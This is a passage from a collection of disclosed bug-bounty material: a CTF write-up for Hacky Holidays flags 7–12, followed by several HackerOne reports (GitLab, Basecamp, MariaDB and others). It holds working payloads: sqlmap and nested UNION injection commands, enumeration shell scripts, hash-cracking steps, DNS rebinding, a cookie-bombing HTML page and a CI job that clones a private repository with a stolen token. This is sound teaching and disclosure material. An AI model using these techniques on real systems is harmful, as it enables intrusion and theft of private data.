Key vulnerability here is that the `{{template:file}}` construction seems to have different validation if used with `preview_markup` or `preview_data` parameter

So if in `preview_markup` we define the `{{name}}` placeholder and try to get the file within this placeholder in `preview_data` we are able to access the admin file and obtain the flag:

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup={{name}}&preview_data={"name"%3a"{{template%3a38dhs_admins_only_header.html}}","email"%3a"alice%40test.com"}

...
  <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```


# flag 8 /forum

Here our objective is accessing the admin area. By basic recon we know that there are at least user grinch and user max. Basic password bruteforcing does not give any result, and also tampering with message and section identifiers (`/forum/N/M`)

Searching for common files and directories with ffuf only revelas a `phpmyadmin`.

	ffuf  -t 4 -u https://hackyholidays.h1ctf.com/forum/FUZZ -w common.txt -mc all -fc 404
	...
	1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
	2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
	login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
	phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
	
	
Fuzzing gives us nothing so we revert to search for the source code of the forum, maybe is on github. This "google dork" 

	"Grinch Forum" site:github.com

reveals
	
	https://github.com/Grinch-Networks/forum

There are no evident vulnerbilities in the source code so we look at the history and find a particular commit where the auhtor forgot to properly purge sensitive data:


```
commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 16:36:07 2020 +0000

    small fix

diff --git a/models/Db.php b/models/Db.php
index 5bea1f5..1dc435c 100755
--- a/models/Db.php
+++ b/models/Db.php
@@ -131,7 +131,7 @@ class Db {
      */
     static public function read(){
         if( gettype(self::$read) == 'string' ) {
-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+            self::$read = new DbConnect( false, '', '','' );
```

Those credentials work on phpmyadmin where we are able to find what looks like md5 hash for the passwords:


```
1 	grinch 	35D652126CA1706B59DB02C93E0C9FBF    1
2 	max   	388E015BC43980947FCE0E5DB16481D1 
```

A visit on crackstation.net immediately reveals the grinch password

	35D652126CA1706B59DB02C93E0C9FBF	md5	BahHumbug
	
With these credentials we are able to access a message which finally reveals the Grinch secret plan:

```
https://hackyholidays.h1ctf.com/forum/3/2


We've launched our recon server, gathered intelligence and pin pointed Santa's location!
Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!

flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
```

We must find that server, and hopefully launch the Grinch weapons against itself!

# flag9 /evil-quiz


We begin the quiz with name `pippo`

	POST /evil-quiz
	name=pippo
	
and post some answers

	POST /evil-quiz/start HTTP/1.1
	Host: hackyholidays.h1ctf.com
	
	ques_1=4&ques_2=3&ques_3=2

What immediately got our attention was this sentence in the score page:

	There is 1 other player(s) with the same name as you!
	

Our first interpretation was that maybe we have to trick this other user to do something via XSS or html link, maybe tampering with our name parameter. But, what was strange, was that even with "xss names" there was always some user with our same username.

After some tampering trying to evade xss filters we got a different message

	There is 0 other player(s) with the same name as you!

It was not immediately evident why, until we tested one character at a time and we learnt that it was the `'` to make the differenc. That smells like SQL Injection.

Actually at some point we begin getting these answers:

```
name=NOME' or 22=1 or '2'='1  ---> There is 0 other player(s) with the same name as you!
name=NOME' or  1=1 or '2'='1  ---> There is 24358 other player(s) with the same name as you
```

Bingo! It is a second order blind sql injection. Sqlmap to the rescue: given a valid session cookie and at least one complete answer to questions in that session (no matter the evil score) these command is sufficient to extract all the information we need:

	
```
sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' \
--data 'name=NOME' \
--second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' \
--random-agent --not-string 'There is 0 other player' \
--technique=B --level=3 --risk=3 \
--cookie 'session=***'  -D quiz -T admin --dump
```

Key here are a couple of things to note here:

- `--second-url` parameters tells sqlmap the page to check our injection results in a different page
- we explicitly give a `--not-string` to look for false result
- `--risk 3` is necessary to let sqlmap try OR based blind injection
- db and table were identified by previious runs of sqlmap, what you have above is the final command
- you cannot specify more than 1 thread because of second order page request (otherwhise one thread will interfere with other threads' result)

Seeing this message told us that we were on the right path

```
...
[17:19:23] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
...
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: name=-3268' OR 6136=6136-- ibKa
    Vector: OR [INFERENCE]
```

And finally, with some patience we get the info we were looking for:

```
Database: quiz
Table: admin
[1 entry]
+----+----------+-------------------+
| id | username | password          |
+----+----------+-------------------+
| 1  | admin    | S3creT_p4ssw0rd-$ |
+----+----------+-------------------+
```

With admin credentials we immediately get the flag:

	flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
	
# flag10 /signup-manager

Simple fuzzing reveals nothing very useful apart the existence of and `admin.php` page which is not directly accessibile via HTTP.

Comment in the home page reveals existence of a `README.md` file4:

```
<!-- See README.md for assistance -->
<!DOCTYPE html>
...
```

This file describes the signupmanager source code which is readily available as `signupmanager.zip`.

It is clear that we have to create a user that has admin rights, but it seems not possible to overflow the string length, given that all paramters are quite strongly filtered:

- password is hashed
- username, first and last name are all subject to length restrictions, for instance

```
$fistname=substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
```

It remains only the age paramter which is subject to these restrictions and conversions:

```
if (!is_numeric($_POST["age"])) {
	$errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
	$errors[] = 'Age entered is too long';
	
$age = intval($_POST["age"]);
}
```
Apparentely it won't be possibile to get an "overflow" but PHP is not strongly typed an setting age **9e9** we pass first check (it's a numeric value, in scientific notation), and as a string it's only 3 characters long. But fortunately for us

```
php > print intval("9e9");
9000000000
```

With this in mind, we are able to get correct length for lastname in order to have a Y as last character of our user line written on disk:

The following paylod finally gives us a valid admin user

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com

action=signup&username=grinch54321&password=a&age=9e9&firstname=aaa&lastname=bbbbbbbbY
```

The flag was

```
<p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
<p class="text-center">You made it through, continue to your next task <a href="/r3c0n_server_4fdk59">here</a></p>
            </div>
```


Tommorrow let's hope to get into the Gringh recon server and maybe DDOS it!

# flag11

We start from `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59` where we read:

	We are currently developing an API, apologies for anything that doesn't work quite right


Every api endpoint seems to give this error

	https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api
 	
	error	"This endpoint cannot be visited from this IP address"

Probably we have to find a way to trick the server in sending requests to this API endpoints via some SSRF.


Initial tought is about the image paramter in these requests:

	https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEyNTQzMTRiODI5MmI4Zjc5MDg2MmQ2M2ZhNWRjZThmLmpwZyIsImF1dGgiOiI5OWMwMGQzZWVmNzA4NDdhYzQ4ODhhZTg1ZDBiNGM3ZSJ9

```
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
{"image":"r3c0n_server_4fdk59\/uploads\/1254314b8292b8f790862d63fa5dce8f.jpg","auth":"99c00d3eef70847ac4888ae85d0b4c7e"}
```

After spending a lot of time trying to reverse engineer the algorithm which signs (via auth paramter) the image paramter.
It was not (at least trying with common passwords as salts) a weak hash of SALT+image, and also length extension attack did not produce anything.

So back to the basic recon.
Initially we did not put much attention on the hash paramter in  `/r3c0n_server_4fdk59/album?hash=` but it is clearly vulnerable so sql injection.

In a few seconds sqlmap reveals

```
Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+


Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```

No other information seems available. Key to understand how to proceed was observing that in the following request the first UNION paramter is used to get the photo from the db


```
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+1,NULL,NULL--+- HTTP/1.1
Host: hackyholidays.h1ctf.com

[picture from album 1 returned]  <--- THIS IS THE KEY DISCOVERY!!! 
```

We are able to confirm that there is a SQLi inside a SQLi (inserting the second one as first union column of the first injection) like in the following example:

	GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"1' order by 3--+-",2,3--+- HTTP/1.1

Finally we are able to insert our data like in the following example, obtaining a valid signature:
	
```
GET /r3c0n_server_4fdk59/album?hash=-1'+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,0x41--+-",2,3--+- HTTP/1.1
Host: hackyholidays.h1ctf.com

     <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL0EiLCJhdXRoIjoiNjAxNDZjMGY5YTQ0YTgyNWZhYTIzZTJkZDE3OWMxM2QifQ==">
```

which is 

	{"image":"r3c0n_server_4fdk59\/uploads\/A","auth":"60146c0f9a44a825faa23e2dd179c13d"}
	
Now we proceed with the assumtion that this image path is used by the server to interrogate the api

We try some common endpoints with this script

```
#!/bin/sh

while read word; do

/bin/echo -n "$word: "
path=$(/bin/echo -n "../api/$word" |xxd -p | tr -d '\n')
picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
echo $picurl

curl -s "https://hackyholidays.h1ctf.com$picurl" |grep -v 404
echo
done
```

The script can be run via:  `cat wordlist.txt | script.sh`

We find two endpoints observing the different responses given by the server:

- ping
- user

While testing the `user` endpoint we notice two different responses for 

- `user?xxx=1`
- `user?username=x`

```
user?xxx=1: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/eHh4PTEiLCJhdXRoIjoiY2FhNzlmNjdiZDZlZDlmOGE5MGI4NjJjOGZmY2RkMGIifQ==
Expected HTTP status 200, Received: 400

user?username=x: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9eCIsImF1dGgiOiI2ZDRhZDg4NTRmNzk5ZTI0NmZmZTEwZTZiZGFkYjE2YiJ9
Expected HTTP status 200, Received: 204
```

This means that user endpoint expects a username parameter, and later on we also find a password paramter.

But now what? Key observation was that by inserting a `%` as username we have again  different response:

```
user?username=%: /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9JSIsImF1dGgiOiIzYjZkNmVmOGRkN2JiNzUxZmI1ZTIwMDJhOGRhZDdhMSJ9
Invalid content type detected
```

This is working but the server does not return a valid image as expected by the caller.

This probably means that username paramter is inserted in a query like

	username LIKE '$username'

This mean we are not able to extract data directly but we should be able to enumerate one character at a time:

	username=a%
	username=b%
	...
	username=g%
	
At `g%` we get a diffrrent response (Invalid content type) so maybe...

	username=gr%
	username=gri%
	
This can be scripted with something like this:

```
#!/bin/sh

start=$1
for word in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
/bin/echo -n "$word: "
path=$(/bin/echo -n "../api/user?pass=$start$word%" |xxd -p | tr -d '\n')
echo path: ${path}
picurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,0x${path}--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
echo $picurl

curl -s "https://hackyholidays.h1ctf.com$picurl"  | grep -i invalid
echo
done
```

Example usage: `./user-enumeration-script.sh grin`

After some tedious work we found the credentials **grinchadmin** **s4nt4sucks** 
These credentials work on /attack-box button giving us flag11:

	flag{07a03135-9778-4dee-a83c-7ec330728e72}

Tomorrow, let's see what is inside this evil box!

# flag12


The grinch attack box fires DDOS against given IPs

- 203.0.113.33 	
- 203.0.113.53 	
- 203.0.113.213

Attacks are launched via this kind of request

	GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1

that redirects you on a page with many similar requests that give the Grinch a feedback on his ddos success of failure

	GET /attack-box/launch/332e283ebf958178fdae26345b921c68.json?id=0 HTTP/1.1	
Attack requests contain (base64 encoded) something like 

	{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}

It is evident from tampering with the target value, that there is some kind of authentication: target of the attack and hash must match.

	{"target":"203.0.113.33", "hash":"5f2940d65ca4140cc18d0878bc398955"}
	{"target":"203.0.113.53", "hash":"2814f9c7311a82f1b822585039f62607"}
	{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}

While in flag11 there probably was a sound hashing mechanism (like HMAC), here it's easy to find a problem
because the Grinch used the infamous combination of `md5($salt.$ip)`, choosing the salt from well known passwords.

By concatenating the first ip `203.0.113.33` with password chosen from the famous *rockyou* list and by
using hashcat we are able to see that the first hash corresponds to this:

	5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33
	
Following commands show how we build a wordlist with the concatened IP address used as input for haschat:

```
cat rockyou.txt | awk '{print $0"203.0.113.33"}' > list.txt
hashcat -O -m0 -a0 hash.txt list.txt 

Dictionary cache built:
* Filename..: list.txt
* Passwords.: 14344392
* Bytes.....: 312054211
* Keyspace..: 14343895
* Runtime...: 2 secs

5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955
```

So the salt is `mrgrinch463`

This is easily confirmed by creating this request, now lecit.

	{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}

Unfortunately this only gives

```
Host Information for: 127.0.0.1
Local target detected, aborting attack
Setting Target Information
Getting Host Information for: 127.0.0.1
Local target detected, aborting attack
```

We then started to use hostnames instead of ip addresses but we got strange responses from the server which put us in a wrong direction (maybe too many hackers trying to DDOS the Grinch server with many requests...).

Anyay, when situation stabilizes it is clear that some basic trick do not work, like using `127.0.0.1.xip.io`. The grinch server specifically resolves hostname
and checks that a DDOS is not launched against itself: 127.0.0.1. That is definitely our target, wherever the Grinch hides.

Given the extensive checks that the grinch does to see if his DDOS is successful, an idea comes to mind. What if
whe set up a name server that responds with a non local ip on first requests, and then change the resolution to 127.0.0.1?
Maybe second time the check against local IPs is not in place (a classic TOCTOU - Time Of Check Time Of Use - vulnerability).

Our hypotesis is based on the observation of this beavhiour:

```
Setting Target Information
Getting Host Information for: 192.168.1.1.xip.io
Host resolves to 192.168.1.1
Spinning up botnet
Launching attack against: 192.168.1.1.xip.io / 192.168.1.1
ping 192.168.1.1
64 bytes from 192.168.1.1: icmp_seq=1 ttl=118 time=22.9 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=118 time=21.2 ms
64 bytes from 192.168.1.1: icmp_seq=3 ttl=118 time=15.9 ms
Host still up, maybe try again?
```

-  Get host information: resolves, check is different that 127.0.0.1
-  then attack

Maybe in the attack phase 127.0.0.1 is not checked again.

So we started our fake nameserver using dnschef

	dnschef -i 0.0.0.0 --fakeip 192.168.1.1
	
having in mind that we should be quite quick and launch it again with different options:	

	dnschef -i 0.0.0.0 --fakeip 127.0.0.1


What happens on the grinch server is described below:

- first check for hostname, it resolves to a non local ip so is good and botnet is spinned up:

```
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=0 HTTP/1.1

[{"id":"3348","content":"Setting Target Information","goto":false},{"id":"3350","content":"Getting Host Information for: x.*********.tk","goto":false},{"id":"3351","content":"Host resolves to 192.168.1.1","goto":false},{"id":"3352","content":"Spinning up botnet","goto":false}]
```

- later on, the check is not in place and our server resolves to 127.0.0.1:

```
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3352 HTTP/1.1
[{"id":"3358","content":"Launching attack against: x.*********.tk \/ 127.0.0.1","goto":false},{"id":"3359","content":"No Response from attack server, retrying...","goto":false}]
```

After all the DDOS is launched and we got confirmation from the Grinch attack box:

```
GET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3360 HTTP/1.1
[{"id":"3362","content":"No Response from attack server, retrying...","goto":"\/attack-box\/challenge-completed-a3c589ba2709"}]
```

Finally we are redirected and we see the message:

```
Well done! You've taken down Grinch Networks and saved the holidays!

flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
```

Merry Xmas!


---------

flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Impact

we are able to dos 127.0.0.1

---

### [Host Header injection in oslo.io (using X-Forwarded-For header) leading to email spoofing](https://hackerone.com/reports/1072277)

- **Report ID:** `1072277`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Logitech
- **Reporter:** @hammodmt
- **Bounty:** - usd
- **Disclosed:** 2021-01-07T21:18:41.842Z
- **CVE(s):** -

**Vulnerability Information:**

#Hello team
##I hope it will be a happy year for you and for me 😇 
## Summary:

I found Host Header injection in oslo.io  
I tried to use it to show the security effect on users And I found this

## Steps To Reproduce:

 1. Well, first of all, enter your project 
2.Make an invitation by email 
3.Now through the burpsuite 
If we try to change the host, 403 will appear
  {F1145857}

So we will use  ```X-Forwarded-Host:  example.com```
 
PoC : 
{F1145858}

## Impact

Many things can be done, including deceiving the user and referring to something else or a login page and stealing their account
>>There is a lot of information about it here : 

 https://portswigger.net/web-security/host-header

---

### [Named pipe connection inteception](https://hackerone.com/reports/1019891)

- **Report ID:** `1019891`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** MariaDB
- **Reporter:** @gabriel_sztejnworcel
- **Bounty:** - usd
- **Disclosed:** 2020-12-17T23:24:05.745Z
- **CVE(s):** -

**Vulnerability Information:**

With MariaDB running on Windows, when local clients connect to the server over named pipes, it's possible for an unprivileged user with an ability to run code on the server machine to intercept the named pipe connection and act as a man-in-the-middle, gaining access to all the data passed between the client and the server, and getting the ability to run arbitrary SQL commands on behalf of the connected user.

On Windows, MariaDB allows local clients to connect to the server over named pipes. Unfortunately, when creating the named pipe server, the security descriptor is not set correctly, and as a result every user on the system can create pipe server instances. This allows for the following attack scenario:
1.	The attacker creates a pipe server instance and waits for a client to connect to it.
2.	Once a client is connected, the attacker connects to the real pipe server instance as a client.
3.	At this point, the attacker is connected to the legitimate client and server, and can pass the messages back and forth, reading the messages (as they are passed in clear text) and possibly changing the messages.

Please see the attached report and POC tool for more information.

## Impact

- All the SQL requests/responses from the intercepted connection
- Ability to run SQL commands

---

### [Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)](https://hackerone.com/reports/403602)

- **Report ID:** `403602`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Basecamp
- **Reporter:** @hudmi
- **Bounty:** - usd
- **Disclosed:** 2020-11-26T18:20:26.237Z
- **CVE(s):** -

**Vulnerability Information:**

Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type. 

https://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html

So with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker. 
To know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/

##Reproduction steps
To upload the files:
1. Login to 3.basecamp.com
2. Open campfire of any project
3. Upload target files 
4. Extract direct links of them to Google Storage and remove `response-content-disposition` param

I have uploaded 3 files by this way:
```
<html manifest="[manifest_url]">
This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```
```
CACHE MANIFEST 

FALLBACK:
/bc3_production_blobs/ [fallback_url]
```
```
<html>
<script>
alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```

##PoC
Go to http://████████/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file.
Refer to the video.

## Impact

Direct links to any attachments can be hijacked and confedential files can be compromised

---

### [Manipulate Uneditable Messages in Support](https://hackerone.com/reports/995969)

- **Report ID:** `995969`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** CS Money
- **Reporter:** @ahmd_halabi
- **Bounty:** - usd
- **Disclosed:** 2020-10-27T19:28:43.629Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hello,

The support section has a validation on all the posted messages where it doesn't allow you to edit your messages after some minutes from posting them.
I was able to bypass this protection and edit successfully the previous messages that can't be edited.

After further investigation, I found that whenever you create/send a message, there is a date value made of numbers generated in the response which indicates the timestamp or the date that the message was created.
And when you edit that message, the same value is used as a date parameter in the edit request.

The bug is that the date parameter is still active for the unedited messages, so when you perform an editable request having the old unedited message's date value as a date parameter, the request will be successful and the new edit text will be successfully applied.

## Steps To Reproduce:
1. So first you need to identify the message initial date, send a message in the support section, intercept its request and see the response containing the target date.

```
█████████
Host: support.cs.money

{"user_steamid":"id-number","text":"test","settings":{"skin_exterior":0,"eco":0,"unavailable":1,"hints_in_trade":1,"lock_skin":0,"popup_skin":1,"reserved_skin":1,"save_filter":0,"virtual_trade":0,"skins_ticker":1,"beautiful_pics":1,"skins_float":0,"rarity":0,"collection":0,"conveyor":1,"block_red_points":0,"sourcePay":"scrill"},"bot_mode":"trade","user_mode":"trade"}
```

██████

'2. Say that you no longer are able to edit the above message created by you. So now create another message. Click edit, send the message and intercept its request.
'3. Add the date value from the step 1 response in the `date` value, and add the new message content in the `new_message` value.

```
███████
Host: support.cs.money

{"date":"date-value","new_message":"Hackerone edited message changed successfully === bug"}
```

'4. Forward the request and see the response code id 200 OK, Reload the page and see that the message is edited successfully.

## Supporting Material/References:
Please see the video below where I explained the bug step-by-step.

█████

## Impact

Users are able to edit their old messages that are not supposed to be editable anymore. This can lead to serious issues because they are being edited on the server too.
Also this is a bypass for the application validation and violation of its protection.
I think this can lead to serious problems if malicious users edit the messages to bad or harmful content.

Best Regards.

---

### [Bypass hide download Nextcloud Share](https://hackerone.com/reports/865777)

- **Report ID:** `865777`
- **Severity:** High
- **Weakness:** Business Logic Errors
- **Program:** Nextcloud
- **Reporter:** @lawsoul
- **Bounty:** - usd
- **Disclosed:** 2020-10-05T10:41:01.211Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary
Hello everyone, accidentally browsing through nextcloud, I have found a small vulnerability on nextcloud server. This vulnerability allow download the file when the download function has been hidden
Here is the error details.
If anything is wrong please respond to me. Thanks you.
## Description
I sharing folder for another ( download not hide)
{F814529}
{F814531}
Of course, the download function is still enabled, I will have the download request as below
{F814536}
I then disabled download on the entire file folder  
{F814542}
{F814546}
But the download link created on the server does not change or change the permissions, I can completely download the file to continue
{F814548}
{F814549}
{F814552}

## Platform(s) Affected:
Nextcloud Server

## Impact

Sensitive documents after sharing that do not allow downloading will be reloaded even if disabled, for anyone

---

### [An attacker can run pipeline jobs as arbitrary user](https://hackerone.com/reports/894569)

- **Report ID:** `894569`
- **Severity:** Critical
- **Weakness:** Business Logic Errors
- **Program:** GitLab
- **Reporter:** @u3mur4
- **Bounty:** 12000 usd
- **Disclosed:** 2020-08-26T14:11:44.351Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

An attacker can run arbitrary pipeline jobs as a `victim` user. This means the attacker can access the user private repositories, member only repositories, registry, etc... by using the victim `CI_JOB_TOKEN` token.

> This is only my recent research and I wanted to report it as soon as possible. I will update the report with more information later on.

### Steps to reproduce

VICTIM:

- Sign in to a GitLab instance as a *Victim user*
- Create an arbitrary private repository with some private files. (We will steal this repo as a poc.)

ATTACKER ACCOUNT 1: 

- Sign in to a GitLab instance as a *Attacker1 user*
- Create a new project using the following settings:
    - Project Name: `poc`
    - Visibility Level : `public`
    - Check the `Initialize repository with a README` checkbox
- Add a new `.gitlab-ci.yml` file to the project

```
image: "ruby:2.6"

before_script:
  - echo Hello

rspec:
  script:
    - echo Hello
```

> We will mirror this repository and update the `.gitlab-ci.yml` file later on to trigger the CI/CD job.

ATTACKER ACCOUNT 2: 
- Sign in / Register to a GitLab instance as a *Attacker2 user*
- Create a new public group called as `test`
- Create a new project inside the `test` group using the following settings:
    - Project Name: `poc`
    - Visibility Level : `public`
- Go to `Project settings` => `Repository` => `Mirroring repositories`
    - Set `Git repository URL` to the previously created repository by the *Attacker1 user*
    - Set `Mirror direction` to `Pull`
    - Check the `Trigger pipelines for mirror updates` checkbox
    - Click the `Mirror repository` button
- Go to the `test` group `Members` option and invite the *Victim user*
- Set the *Victim user* `Choose a role permission` to `Owner`
- Go to the `Account Setting` => `Account` and delete this account.

ATTACKER ACCOUNT 1: 

- Sign in back to the GitLab instance as a *Attacker1 user*
- Go to the `attacker1/poc` project and update the `.gitlab-ci.yml` file using the following content:

```
image: "ruby:2.6"

rspec:
  script:
    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git
    - cd private_repo_name
    - ls -lah .
    - cat README.md
```
- Wait half an hour to automatically trigger a mirror update in the `test/poc` project which owner is the *Victim user*.

The `test/poc` project will trigger a mirror update which also triggers a pipeline run. The triggerer of the pipeline will be the *Victim user*. 
The *Attacker1 user* controls the `attacker/poc/gitlab-ci.yml` file which is mirrored to the `test/poc` project.


### What is the current *bug* behavior?

- If there is a mirrored project with `Trigger pipelines for mirror updates` enabled inside a group and the group owner delete its account (need another owner role inside the group) then the trigger of the pipeline will be to other owner account. (I think this only works when the account deleted without removing the account from the group members but I still need to confirm this.)

### What is the expected *correct* behavior?

- refuse pipeline run in the previously mentioned case

### Output of checks

This bug happens on GitLab.com.

#### Results of GitLab environment info
```
bundle exec rake gitlab:env:info RAILS_ENV=development
System information
System:		
Proxy:		no
Current User:	u3mur4
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	3.0.3
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	6.0.4
Git Version:	2.27.0
Sidekiq Version:5.2.7
Go Version:	go1.14.4 linux/amd64

GitLab information
Version:	13.1.0-pre
Revision:	4bd9f8164e0
Directory:	/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab
DB Adapter:	PostgreSQL
DB Version:	12.3
URL:		http://gdk.yoyo.pw:3000
HTTP Clone URL:	http://gdk.yoyo.pw:3000/some-group/some-project.git
SSH Clone URL:	ssh://u3mur4@gdk.yoyo.pw:2222/some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: google_oauth2

GitLab Shell
Version:	13.3.0
Repository storage paths:
- default: 	/home/u3mur4/Hack/gitlab/gitlab-development-kit/repositories
GitLab Shell path:		/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab-shell
Git:		/usr/bin/git
```

## Impact

stealing the CI_JOB_TOKEN of any user (access the user private repositories, member only repositories and registry, etc...)

---

### [Availing Zomato gold by using a random third-party `wallet_id`](https://hackerone.com/reports/938021)

